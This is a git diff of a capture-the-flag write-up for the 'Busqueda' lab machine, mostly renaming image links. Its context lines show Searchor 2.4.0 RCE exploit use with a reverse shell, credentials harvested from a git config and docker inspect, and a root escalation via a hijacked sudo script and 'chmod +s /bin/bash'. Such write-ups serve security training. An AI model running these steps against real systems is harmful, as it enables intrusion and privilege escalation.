@@ -6,16 +6,18 @@
 nmap -sC -sV -oN busquesda_light 10.10.11.208
 ```
 
-![image](./IMG/Enum%20-%20nmap.png)
+![image](./IMG/0.png)
+
+![[./IMG/42.png]]
 ### Web Service 
 
 > Visit Web Top Page
 
-![image](./IMG/Enum%20-%20web%20top%20page.png)
+![image](./IMG/1.png)
 
 > Find the clue about web framework - Searchor 2.4.0
 
-![image](./IMG/Enum%20-%20web%20framework%20-%20Searchor.png)
+![image](./IMG/2.png)
 
 > Research for Searchor 2.4.0
 
@@ -23,20 +25,20 @@ nmap -sC -sV -oN busquesda_light 10.10.11.208
 searchsploit searchor
 ```
 
-![image](./IMG/Enum%20-%20searchor%20exploit%20search.png)
+![image](./IMG/3.png)
 
 > Research from internet 
 
-![image](./IMG/Enum%20-%20Searchor%20research.png)
+![image](./IMG/4.png)
 
 > Find some exploit codes for searchor
 1. [Searchor_2.4.0_RCE_Python](https://github.com/twisted007/Searchor_2.4.0_RCE_Python)
 2. [Searchor-2.4.0-POC-Exploit](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)
 3. [Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)
 
-![image](./IMG/Enum%20-%20Find%20exploit%20code%20for%20searchor.png)
+![image](./IMG/5.png)
 
-![image](./IMG/Enum%20-%20Detail%20of%20exploit%20code%20for%20searchor.png)
+![image](./IMG/6.png)
 
 ## Exploit 
 
@@ -47,18 +49,18 @@ searchsploit searchor
 python searchor-2_4_0_RCE.py
 ```
 
-![image](./IMG/Exploit%20-%20Execute%20searchor%20RCE.png)
+![image](./IMG/7.png)
 
 > Following the usage guide to execute it again
 
 ```
 python searchor-2_4_0_RCE.py searcher.htb 10.10.16.107 1337
 ```
-![image](./IMG/Exploit%20-%20Execute%20exploit%20code%20for%20searchor%20RCE.png)
+![image](./IMG/8.png)
 
 > Check nc listener, it will get reverse shell
 
-![image](./IMG/Exploit%20-%20nc%20get%20rev%20shell.png)
+![image](./IMG/9.png)
 
 > Confirm the current user, its 'svc'
 
@@ -69,7 +71,7 @@ whoami
 
 > Get user flag
 
-![image](./IMG/Exploit%20-%20user%20flag.png)
+![image](./IMG/10.png)
 ## Privilege Escalation 
 
 > After get the permission of victim
@@ -81,15 +83,15 @@ sudo -l
 
 > It'll ask password.
 
-![image](./IMG/Privilege%20-%20check%20sudo%20permission.png)
+![image](./IMG/11.png)
 
 - Enum the website directory 
 
-![image](./IMG/Privilege%20-%20webroot%20name.png)
+![image](./IMG/12.png)
 
 - Check the webroot content, I found a hidden file '.git'
 
-![image](./IMG/Privilege%20-%20webroot%20content.png)
+![image](./IMG/13.png)
 
 - Check git directory, I find a config file.
 - In this config file, it includes the credential.
@@ -105,25 +107,25 @@ cody / jh1usoih2bkjaspwe92
 gitea.searcher.htb
 ```
 
-![image](./IMG/Privilege%20-%20git%20config%20content.png)
+![image](./IMG/14.png)
 
 - Access the subdomain 
 
-![image](./IMG/Privilege%20-%20subdomain%20web%20content.png)
+![image](./IMG/15.png)
 
 - Login with cody credential
 
-![image](./IMG/Privilege%20-%20login%20gitea%20page%20with%20cody%20creds.png)
+![image](./IMG/16.png)
 
 - It's a git repository service 
 - Check repository in cody's credential, only have Searcher website's source code.
 
-![image](./IMG/Privilege%20-%20Check%20cody%20repo.png)
+![image](./IMG/17.png)
 
 - But I also find the Searcher web site is created by administrator
 - So there should exist another user named 'administrator'
 
-![image](./IMG/Privilege%20-%20Find%20administrator%20user%20for%20gitea%20service%20in%20cody%20account.png)
+![image](./IMG/18.png)
 
 - Execute the sudo list permission command again 
 
@@ -133,9 +135,9 @@ sudo -l
 
 - Using cody's credential
 
-![image](./IMG/Privilege%20-%20Try%20cody%20credential%20on%20svc%20to%20read%20sudo%20permission.png)
+![image](./IMG/19.png)
 
-![image](./IMG/Privilege%20-%20sudo%20permission%20content.png)
+![image](./IMG/41.png)
 
 - Then follow the result, execute system-checkup.py like sudo permission for user svc
 
@@ -143,7 +145,7 @@ sudo -l
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py
 ```
 
-![image](./IMG/Privilege%20-%20Confirm%20the%20usage%20of%20system-checkup.png)
+![image](./IMG/20.png)
 
 - Check the content of /opt/scripts 
 
@@ -151,11 +153,11 @@ sudo /usr/bin/python3 /opt/scripts/system-checkup.py
 ls /opt/scripts
 ```
 
-![image](./IMG/Privilege%20-%20Content%20of%20scripts%20directory.png)
+![image](./IMG/21.png)
 
 - Check the code of system-checkup.py --> Failed (Permission denied)
 
-![image](./IMG/Privilege%20-%20Try%20to%20check%20the%20content%20of%20system-checkup%20python.png)
+![image](./IMG/22.png)
 
 - It's not able to analysis the system-checkup code.
 - So, I need to just follow the usage guide to execute this python file then analysis the action of this scripts.
@@ -166,7 +168,7 @@ ls /opt/scripts
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
 ```
 
-![image](./IMG/Privilege%20-%20Execute%20docker%20ps%20on%20through%20system-checkup.png)
+![image](./IMG/23.png)
 
 - 2 active docker container
 - Try to execute docker inspect 
@@ -174,7 +176,7 @@ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
 ```
 
-![image](./IMG/Privilege%20-%20docker-inspect%20execute.png)
+![image](./IMG/24.png)
 
 - It will show another usage guide, I will need to provide 2 parameter 
 	1. format
@@ -187,7 +189,7 @@ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
 
 - According to the guideline, I can use '{{json .Config}}' as json format/
 
-![image](./IMG/Privilege%20-%20Check%20the%20usage%20about%20docker%20inspect.png)
+![image](./IMG/25.png)
 
 > Execute to check 1st docker container
 
@@ -195,7 +197,7 @@ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a5b33fb5a
 ```
 
-![image](./IMG/Privilege%20-%20Execute%20docker%20inspect%20on%20docker%20ID%20through%20system-checkup.png)
+![image](./IMG/26.png)
 
 > Find the following password 
 
@@ -211,7 +213,7 @@ MYSSQL_PASSWORD = yuiu1hoiu4i5ho1uh
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e
 ```
 
-![image](./IMG/Privilege%20-%20Execute%20docker%20inspect%20on%20docker%20ID%20through%20system-checkup%202.png)
+![image](./IMG/27.png)
 
 > Find the following password 
 ```
@@ -228,11 +230,11 @@ GITEA_database_PASSWD = yuiu1hoiu4i5ho1uh
 
 > The 1st one will success
 
-![image](./IMG/Privilege%20-%20Access%20administrator%20user%20for%20gitea%20service.png)
+![image](./IMG/28.png)
 
 > Check the code in administrator 
 
-![image](./IMG/Privilege%20-%20Check%20%20repo%20%20in%20administrator%20user.png)
+![image](./IMG/29.png)
 
 > Read the content of system-checkup.py
 
@@ -369,14 +371,14 @@ print('')
 exit(1)
 ```
 
-![image](./IMG/Privilege%20-%20Check%20content%20of%20system-checkup%20-1.png)
+![image](./IMG/30.png)
 
-![image](./IMG/Privilege%20-%20Check%20content%20of%20system-checkup%20-2.png)
+![image](./IMG/31.png)
 
 > The valuable to do escalate is full-checkup 
 > Full-checkup function will execute shell file
 
-![image](./IMG/Privilege%20-%20full%20check%20function%20in%20system-checkup.png)
+![image](./IMG/32.png)
 
 > Try to execute full-checkup
 
@@ -384,11 +386,11 @@ exit(1)
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
 ```
 
-![image](./IMG/Privilege%20-%20Execute%20full%20docker%20checkup%20through%20system-checkup.png)
+![image](./IMG/33.png)
 
 > Check the detail of full-check.sh in repo
 
-![image](./IMG/Privilege%20-%20full-checkup%20shell%20content.png)
+![image](./IMG/34.png)
 
 > So, the original full-checkup shell script will check the container status and the information of all container.
 ### Organize all the information 
@@ -414,7 +416,7 @@ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
 chmod +s /bin/bash
 ```
 
-![image](./IMG/Privilege%20-%20Content%20of%20fake%20full-checkup.png)
+![image](./IMG/35.png)
 
 > Execute fake full-checkup script by system-checkup.py
 
@@ -422,11 +424,11 @@ chmod +s /bin/bash
 python3 /opt/scripts/system-checkup.py full-checkup
 ```
 
-![image](./IMG/Privilege%20-%20Execute%20escalate%20%20code%20by%20system-checkup%20on%20fake%20full-checkup.png)
+![image](./IMG/36.png)
 
 > After executing, check the current permission setting on /bin/bash 
 
-![image](./IMG/Privilege%20-%20Check%20the%20suid%20on%20bash%20file.png)
+![image](./IMG/37.png)
 
 > Using bash with privilege option to escalate the root permission  
 
@@ -434,16 +436,15 @@ python3 /opt/scripts/system-checkup.py full-checkup
 bash -p
 ```
 
-![image](./IMG/Privilege%20-%20bash%20privilege%20mode%20to%20escalate%20permission.png)
+![image](./IMG/38.png)
 
 > Check  user permission, I can find the euid with root permission get
 
-![image](./IMG/Privilege%20-%20Check%20root%20permission%20in%20id.png)
+![image](./IMG/39.png)
 
 > Get root flag
 
-![image](./IMG/Privilege%20-%20root%20flag.png)
-
+![image](./IMG/40.png)
 
 ## Reference 
 
